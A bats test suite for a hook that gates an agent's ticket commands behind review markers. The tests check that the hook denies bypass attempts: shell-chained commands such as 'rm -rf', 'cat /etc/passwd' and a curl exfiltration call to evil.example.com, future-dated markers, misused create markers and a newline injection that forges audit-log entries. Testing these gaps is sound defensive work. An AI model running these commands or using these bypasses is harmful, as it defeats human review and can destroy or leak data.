#!/usr/bin/env bats
# require-review-security-gaps.bats
#
# BC-3.01.001 v1.25 — Adversarial security gaps (S-3.01)
#
# Covers:
#   C1  (CRITICAL)  EC-023 direction B / SM-37 / BC-3.01.001 PC#2 step (6a)
#                   Regular ["create"] marker must NOT authorize review-labeled create.
#                   Gap: cmd_type="" for creates → STEP 6 block skipped entirely →
#                   structural_label_check never called → marker consumed → ALLOW (BUG).
#
#   I1  (MAJOR)     BC-3.01.001 PC#2 step (5) scope contract — trailing shell metachar injection.
#                   Gap: ( |$) boundary guards only project-key prefix extension, not tail;
#                   bash =~ is not tail-anchored → space before ; | & ` $( \n satisfies ( |$)
#                   → step 5 passes on chained commands → ALLOW (BUG).
#
#   I2  (MEDIUM)    BC-3.01.001 PC#2 step (3) — future-dated marker skip.
#                   Gap: issued_at_utc never read → future-dated markers pass all checks → ALLOW (BUG).
#
#   I3  (MEDIUM)    BC-3.01.001 Invariant #2 / VP-HOOK-024 / ADV-F2-013 / ADV-F2-P4-010
#                   Audit record completeness + sanitization.
#                   Gap: audit line only writes "... MARKER_USED marker_id=..." — missing
#                   op=, ticket=, org=, command_b64= fields; marker_id not sanitized → newline
#                   in marker_id can inject a forged MARKER_USED line.
#
#   VP-HOOK-024     Process-gap — base marker-consume regression coverage (comment path)
#   port            ported into hooks/ tree. Coupled to I3: audit completeness assertions
#                   make these RED under current code.
#
# Red Gate target: ALL 15 new tests FAIL against HEAD 4131c62 (current require-review.sh).
# Existing 27 tests in require-review-link-close.bats remain green.
# NOTE: newline injection via \n is NOT a gap on macOS bash ($ in ERE matches only
# end-of-string, not before \n). That vector is omitted; the other five metachar vectors
# (;, |, &&, `, $()) are confirmed gaps on all platforms.
#
# Test naming: test_BC_S_SS_NNN_<finding>_<assertion>

PLUGIN_ROOT="${BATS_TEST_DIRNAME}/../.."

# ── helpers ─────────────────────────────────────────────────────────────────

setup() {
  TEST_TMP=$(mktemp -d)
  MARKER_DIR="${TEST_TMP}/markers"
  mkdir -p "${MARKER_DIR}"
  export CLAUDE_PLUGIN_DATA="${TEST_TMP}"
}

teardown() {
  rm -rf "${TEST_TMP}"
}

# _run_hook CMD — pipe CMD as a PreToolUse/Bash JSON envelope to require-review.sh.
# Uses jq -R . to properly JSON-encode CMD (handles embedded quotes, $, etc.).
_run_hook() {
  local cmd="$1"
  local json
  json=$(printf '{"tool_input":{"command":%s}}' "$(printf '%s' "${cmd}" | jq -R .)")
  run bash -c 'printf "%s" "$1" | CLAUDE_PLUGIN_DATA="$2" "$3/hooks/require-review.sh"' \
      -- "${json}" "${CLAUDE_PLUGIN_DATA}" "${PLUGIN_ROOT}"
}

# _run_hook_raw JSON — pass a pre-built JSON string directly (used for commands that
# contain characters jq -R . cannot handle without splitting, e.g. literal newlines).
_run_hook_raw() {
  local json="$1"
  run bash -c 'printf "%s" "$1" | CLAUDE_PLUGIN_DATA="$2" "$3/hooks/require-review.sh"' \
      -- "${json}" "${CLAUDE_PLUGIN_DATA}" "${PLUGIN_ROOT}"
}

# _write_marker FILENAME JSON — write a marker file into the test marker dir
_write_marker() {
  local filename="$1"
  local content="$2"
  printf "%s" "${content}" > "${MARKER_DIR}/${filename}"
}

# _future_ts — UTC timestamp 300 s in the future
_future_ts() {
  if date --version 2>/dev/null | grep -q GNU; then
    date -u -d '+300 seconds' '+%Y-%m-%dT%H:%M:%SZ'
  else
    date -u -v+300S '+%Y-%m-%dT%H:%M:%SZ'
  fi
}

# _far_future_ts — UTC timestamp 600 s in the future (expires_at_utc when issued_at_utc is also future)
_far_future_ts() {
  if date --version 2>/dev/null | grep -q GNU; then
    date -u -d '+600 seconds' '+%Y-%m-%dT%H:%M:%SZ'
  else
    date -u -v+600S '+%Y-%m-%dT%H:%M:%SZ'
  fi
}

# _now_ts — current UTC timestamp
_now_ts() {
  date -u '+%Y-%m-%dT%H:%M:%SZ'
}

# ── C1 (CRITICAL): STEP-6a create anti-fungibility / EC-023 direction B / SM-37 ──
# BC-3.01.001 PC#2 step (6a): structural_label_check(cmd)=TRUE AND
# authorized_operations==["create"] → CONTINUE (anti-fungibility gate).
# Gap: cmd_type="" for create commands → if [[ -n "$cmd_type" ]] block skipped →
# structural_label_check never invoked → marker consumed → ALLOW (security bypass).

@test "test_BC_3_01_001_C1_SM37_regular_create_marker_denied_for_review_required_label" {
  # C1 CRITICAL / EC-023 direction B / SM-37 kill (remove STEP-6a create check)
  # BC-3.01.001 v1.25 PC#2 step (6a): ["create"] marker + --label REVIEW-REQUIRED → DENY.
  # Current gap: STEP 6 skipped for creates (cmd_type="") → ALLOW (BUG) → RED Gate.
  local now future
  now=$(_now_ts); future=$(_future_ts)
  _write_marker "create-c1-rr.marker.json" \
    '{"marker_id":"m-c1-rr","ticket_id":null,"org_slug":"test","authorized_operations":["create"],"command_pattern":"^jr (--output json )?issue create --project PRISMDEMO( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook 'jr issue create --project PRISMDEMO --label REVIEW-REQUIRED --summary "[REVIEW-REQUIRED] SEC-789 HIGH"'
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
  [[ "$output" == *"review approval"* ]]
}

@test "test_BC_3_01_001_C1_SM37_regular_create_marker_denied_for_blind_spot_label" {
  # C1 CRITICAL / EC-023 direction B / SM-37 — BLIND-SPOT label variant.
  # structural_label_check recognises BLIND-SPOT as a hard-floor review label.
  # Current gap: STEP 6 skipped → ALLOW (BUG) → RED Gate.
  local now future
  now=$(_now_ts); future=$(_future_ts)
  _write_marker "create-c1-bs.marker.json" \
    '{"marker_id":"m-c1-bs","ticket_id":null,"org_slug":"test","authorized_operations":["create"],"command_pattern":"^jr (--output json )?issue create --project PRISMDEMO( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook 'jr issue create --project PRISMDEMO --label BLIND-SPOT --summary "[BLIND-SPOT] sensor silent >24h"'
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
  [[ "$output" == *"review approval"* ]]
}

@test "test_BC_3_01_001_C1_SM37_regular_create_allows_unlabeled_and_denies_review_labeled" {
  # C1 CRITICAL / EC-023 compound (regression + direction B)
  # Part A: ["create"] marker + unlabeled create → ALLOW (regression; PASSES current code).
  # Part B: fresh ["create"] marker + review-labeled create → DENY (FAILS current code → RED).
  # Combined test is RED because Part B fails.
  local now future
  now=$(_now_ts); future=$(_future_ts)

  # Part A: unlabeled create → ALLOW (proves marker path works and is not blocked upstream)
  _write_marker "create-c1-cmpA.marker.json" \
    '{"marker_id":"m-c1-cmpA","ticket_id":null,"org_slug":"test","authorized_operations":["create"],"command_pattern":"^jr (--output json )?issue create --project PRISMDEMO( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook 'jr issue create --project PRISMDEMO --summary "FP: R-001 benign activity"'
  allow_output="$output"; allow_status="$status"

  # Part B: review-labeled create + regular marker → DENY (FAILS under current code)
  _write_marker "create-c1-cmpB.marker.json" \
    '{"marker_id":"m-c1-cmpB","ticket_id":null,"org_slug":"test","authorized_operations":["create"],"command_pattern":"^jr (--output json )?issue create --project PRISMDEMO( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook 'jr issue create --project PRISMDEMO --label REVIEW-REQUIRED --summary "[REVIEW-REQUIRED] SEC-42 HIGH"'

  # Part A: regression guard
  [ "${allow_status}" -eq 0 ]
  [[ "${allow_output}" == *'"permissionDecision":"allow"'* ]]
  # Part B: FAILS under current code → Red Gate
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

# ── I1 (MAJOR): trailing shell metachar injection ──────────────────────────────
# BC-3.01.001 PC#2 step (5) scope contract: anchored command_pattern with ( |$) boundary.
# Gap: bash =~ is NOT tail-anchored. ( |$) matches the space/EOL before a metachar,
# allowing "jr issue link SEC-123 SEC-456 ; evil" to satisfy the pattern. No metachar
# rejection guard exists in the current hook. All five vectors ALLOW (BUG).

@test "test_BC_3_01_001_I1_link_cmd_semicolon_chain_denied" {
  # I1 MAJOR / BC-3.01.001 PC#2 step (5) — semicolon chain: space before ; satisfies ( |$).
  # valid ["link"] marker + "jr issue link SEC-123 SEC-456 ; rm -rf /tmp/x" → must DENY.
  # Current gap: ( |$) matches space → ALLOW (BUG) → RED Gate.
  local now future
  now=$(_now_ts); future=$(_future_ts)
  _write_marker "link-i1-semi.marker.json" \
    '{"marker_id":"m-i1-semi","ticket_id":"SEC-123","org_slug":"test","authorized_operations":["link"],"command_pattern":"^jr (--output json )?issue link SEC-123 SEC-456( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook 'jr issue link SEC-123 SEC-456 ; rm -rf /tmp/x'
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

@test "test_BC_3_01_001_I1_link_cmd_pipe_chain_denied" {
  # I1 MAJOR — pipe metachar: space before | satisfies ( |$).
  # valid ["link"] marker + "jr issue link SEC-123 SEC-456 | cat /etc/passwd" → must DENY.
  local now future
  now=$(_now_ts); future=$(_future_ts)
  _write_marker "link-i1-pipe.marker.json" \
    '{"marker_id":"m-i1-pipe","ticket_id":"SEC-123","org_slug":"test","authorized_operations":["link"],"command_pattern":"^jr (--output json )?issue link SEC-123 SEC-456( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook 'jr issue link SEC-123 SEC-456 | cat /etc/passwd'
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

@test "test_BC_3_01_001_I1_link_cmd_and_chain_denied" {
  # I1 MAJOR — && metachar: space before & satisfies ( |$).
  # valid ["link"] marker + "jr issue link SEC-123 SEC-456 && evil" → must DENY.
  local now future
  now=$(_now_ts); future=$(_future_ts)
  _write_marker "link-i1-and.marker.json" \
    '{"marker_id":"m-i1-and","ticket_id":"SEC-123","org_slug":"test","authorized_operations":["link"],"command_pattern":"^jr (--output json )?issue link SEC-123 SEC-456( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook 'jr issue link SEC-123 SEC-456 && curl http://evil.example.com/exfil'
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

@test "test_BC_3_01_001_I1_link_cmd_backtick_injection_denied" {
  # I1 MAJOR — backtick command substitution: space before ` satisfies ( |$).
  # valid ["link"] marker + "jr issue link SEC-123 SEC-456 `id`" → must DENY.
  local now future
  now=$(_now_ts); future=$(_future_ts)
  _write_marker "link-i1-bt.marker.json" \
    '{"marker_id":"m-i1-bt","ticket_id":"SEC-123","org_slug":"test","authorized_operations":["link"],"command_pattern":"^jr (--output json )?issue link SEC-123 SEC-456( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  # single-quotes prevent backtick interpretation by caller's shell
  _run_hook 'jr issue link SEC-123 SEC-456 `id`'
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

@test "test_BC_3_01_001_I1_link_cmd_subshell_expansion_denied" {
  # I1 MAJOR — $() subshell: space before $( satisfies ( |$).
  # valid ["link"] marker + "jr issue link SEC-123 SEC-456 $(id)" → must DENY.
  local now future
  now=$(_now_ts); future=$(_future_ts)
  _write_marker "link-i1-sub.marker.json" \
    '{"marker_id":"m-i1-sub","ticket_id":"SEC-123","org_slug":"test","authorized_operations":["link"],"command_pattern":"^jr (--output json )?issue link SEC-123 SEC-456( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook 'jr issue link SEC-123 SEC-456 $(id)'
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

@test "test_BC_3_01_001_I1_close_cmd_semicolon_chain_denied" {
  # I1 MAJOR — close command variant: "jr issue move SEC-123 Done ; rm -rf /tmp/y".
  # Pattern ^jr...Done( |$): space before ; satisfies ( |$) → step 5 passes → ALLOW (BUG).
  local now future
  now=$(_now_ts); future=$(_future_ts)
  _write_marker "close-i1-semi.marker.json" \
    '{"marker_id":"m-i1-cl-semi","ticket_id":"SEC-123","org_slug":"test","authorized_operations":["close"],"command_pattern":"^jr (--output json )?issue move SEC-123 (Done|Closed|Resolved)( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook 'jr issue move SEC-123 Done ; rm -rf /tmp/y'
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

# ── I2 (MEDIUM): BC step (3) future-dated marker skip ─────────────────────────
# BC-3.01.001 PC#2 step (3): "if issued_at_utc > now() → skip (adversarial signal)".
# Gap: issued_at_utc is never read in the current implementation. A marker with
# issued_at_utc in the future passes the TTL check (only expires_at_utc is checked)
# and is consumed → ALLOW (BUG).

@test "test_BC_3_01_001_I2_future_issued_at_utc_link_marker_denied" {
  # I2 MEDIUM / BC-3.01.001 PC#2 step (3) — future-dated issued_at_utc on a link marker.
  # issued_at_utc = now+300s (future); expires_at_utc = now+600s (even further future).
  # Step (4b) TTL check passes (expires_at_utc > now). Step (3) check (not implemented)
  # should skip/deny. Current gap: step (3) missing → marker consumed → ALLOW (BUG) → RED.
  local future far_future
  future=$(_future_ts); far_future=$(_far_future_ts)
  _write_marker "link-i2-future.marker.json" \
    '{"marker_id":"m-i2-link","ticket_id":"SEC-123","org_slug":"test","authorized_operations":["link"],"command_pattern":"^jr (--output json )?issue link SEC-123 SEC-456( |$)","issued_at_utc":"'"${future}"'","expires_at_utc":"'"${far_future}"'"}'
  _run_hook "jr issue link SEC-123 SEC-456"
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
  [[ "$output" == *"review approval"* ]]
}

@test "test_BC_3_01_001_I2_future_issued_at_utc_close_marker_denied" {
  # I2 MEDIUM / BC step (3) — close command variant; future-dated marker must be skipped.
  # Current gap: issued_at_utc not read → ALLOW (BUG) → RED Gate.
  local future far_future
  future=$(_future_ts); far_future=$(_far_future_ts)
  _write_marker "close-i2-future.marker.json" \
    '{"marker_id":"m-i2-close","ticket_id":"SEC-123","org_slug":"test","authorized_operations":["close"],"command_pattern":"^jr (--output json )?issue move SEC-123 (Done|Closed|Resolved)( |$)","issued_at_utc":"'"${future}"'","expires_at_utc":"'"${far_future}"'"}'
  _run_hook "jr issue move SEC-123 Done"
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
  [[ "$output" == *"review approval"* ]]
}

# ── I3 (MEDIUM): audit record completeness + sanitization ─────────────────────
# BC-3.01.001 Invariant #2 / VP-HOOK-024 / ADV-F2-013 / ADV-F2-P4-010
# BC step (8) canonical audit line:
#   "${ISO_NOW} MARKER_USED marker_id=... op=${safe_op} ticket=${safe_ticket}
#    org=${safe_org} command_b64=${command_b64}"
# Current gap: only "... MARKER_USED marker_id=..." — op/ticket/org/command_b64 missing;
# marker_id not sanitized (newline injection possible).

@test "test_BC_3_01_001_I3_VP024_audit_line_must_include_all_required_fields" {
  # I3 MEDIUM / Invariant #2 / VP-HOOK-024 / ADV-F2-013 / ADV-F2-P4-010
  # BC step (8) mandates op=, ticket=, org=, command_b64= in every audit line.
  # Current gap: audit line only has "MARKER_USED marker_id=..." → all assertions FAIL → RED.
  local now future
  now=$(_now_ts); future=$(_future_ts)
  _write_marker "link-i3-fields.marker.json" \
    '{"marker_id":"m-i3-fields","ticket_id":"SEC-100","org_slug":"myorg","authorized_operations":["link"],"command_pattern":"^jr (--output json )?issue link SEC-100 SEC-200( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook "jr issue link SEC-100 SEC-200"
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"allow"'* ]]
  [ -f "${MARKER_DIR}/audit.log" ]
  grep -q "MARKER_USED" "${MARKER_DIR}/audit.log"
  # Required fields — FAIL under current code (audit line lacks all four):
  grep -q " op=" "${MARKER_DIR}/audit.log"
  grep -q " ticket=" "${MARKER_DIR}/audit.log"
  grep -q " org=" "${MARKER_DIR}/audit.log"
  grep -q " command_b64=" "${MARKER_DIR}/audit.log"
}

@test "test_BC_3_01_001_I3_VP024_marker_id_newline_cannot_forge_second_audit_line" {
  # I3 MEDIUM / Invariant #2 / VP-HOOK-024 — newline-injection / audit-forgery prevention.
  # BC step (8): control chars (0x00-0x1f) stripped from all attacker-influenceable fields
  # before interpolation. A marker_id containing \n must not produce a second MARKER_USED
  # line in audit.log (forged audit record).
  # JSON \n in marker_id → jq -r emits literal LF → printf '%s...%s\n' injects second line.
  # Current gap: marker_id not sanitized → forged line written → grep '^MARKER_USED' finds it
  # → test assertion fails → RED Gate.
  local now future
  now=$(_now_ts); future=$(_future_ts)
  # JSON \n in marker_id is interpreted by jq as a newline character
  _write_marker "link-i3-nl.marker.json" \
    '{"marker_id":"m-i3-forge\nMARKER_USED marker_id=INJECTED-LINE","ticket_id":"SEC-104","org_slug":"test","authorized_operations":["link"],"command_pattern":"^jr (--output json )?issue link SEC-104 SEC-205( |$)","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook "jr issue link SEC-104 SEC-205"
  # If hook allows: audit.log must NOT contain a line that STARTS WITH "MARKER_USED"
  # (a legitimate audit line always starts with a timestamp, not "MARKER_USED" directly).
  [ -f "${MARKER_DIR}/audit.log" ]
  forged_count=$(grep -c '^MARKER_USED' "${MARKER_DIR}/audit.log")
  # Currently: forged_count=1 (second line injected) → assertion fails → RED
  [ "${forged_count}" -eq 0 ]
}

# ── VP-HOOK-024 marker-coverage port (process-gap) ────────────────────────────
# Ports base marker-consume regression coverage for the comment path into the hooks/
# test tree. Tests are coupled to I3 (audit completeness) so they are RED under
# current code and become GREEN only when both the ALLOW path and complete audit are
# implemented. This ensures these controls are regression-guarded in the hooks/ suite.

@test "test_BC_3_01_001_VP024_port_comment_marker_allow_writes_complete_audit" {
  # VP-HOOK-024 base path (comment marker) — allow + complete audit.
  # BC canonical vector: valid comment marker → allow; audit line has all required fields.
  # I3 coupling: current audit line lacks op/ticket/org/command_b64 → FAIL → RED Gate.
  local now future
  now=$(_now_ts); future=$(_future_ts)
  _write_marker "comment-vp024-compl.marker.json" \
    '{"marker_id":"m-vp024-all","ticket_id":"SEC-500","org_slug":"acme","authorized_operations":["comment"],"command_pattern":"^jr (--output json )?issue comment SEC-500 ","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'
  _run_hook 'jr issue comment SEC-500 "enrichment complete"'
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"allow"'* ]]
  [ -f "${MARKER_DIR}/audit.log" ]
  grep -q "MARKER_USED" "${MARKER_DIR}/audit.log"
  # I3 coupling — FAIL under current code:
  grep -q " op=" "${MARKER_DIR}/audit.log"
  grep -q " ticket=" "${MARKER_DIR}/audit.log"
  grep -q " org=" "${MARKER_DIR}/audit.log"
  grep -q " command_b64=" "${MARKER_DIR}/audit.log"
}

@test "test_BC_3_01_001_VP024_port_comment_single_use_denied_and_first_use_has_complete_audit" {
  # VP-HOOK-024 base path (comment marker single-use + audit) — compound.
  # Part A: first use → ALLOW + complete audit (I3 coupling: FAILS at command_b64=) → RED Gate.
  # Part B: second use → DENY (single-use via atomic rename; passes after I3+fix; tested here
  #         as future regression guard — only reached after Part A assertions pass post-fix).
  local now future
  now=$(_now_ts); future=$(_future_ts)
  _write_marker "comment-vp024-su2.marker.json" \
    '{"marker_id":"m-vp024-su2","ticket_id":"SEC-501","org_slug":"acme","authorized_operations":["comment"],"command_pattern":"^jr (--output json )?issue comment SEC-501 ","issued_at_utc":"'"${now}"'","expires_at_utc":"'"${future}"'"}'

  # Part A: first use — ALLOW
  _run_hook 'jr issue comment SEC-501 "first enrichment"'
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"allow"'* ]]
  [ -f "${MARKER_DIR}/audit.log" ]
  # I3 coupling: FAILS under current code → test is RED
  grep -q " command_b64=" "${MARKER_DIR}/audit.log"

  # Part B: second use — DENY (replay blocked by atomic rename; regression guard)
  _run_hook 'jr issue comment SEC-501 "replay attempt"'
  [ "$status" -eq 0 ]
  [[ "$output" == *'"permissionDecision":"deny"'* ]]
}
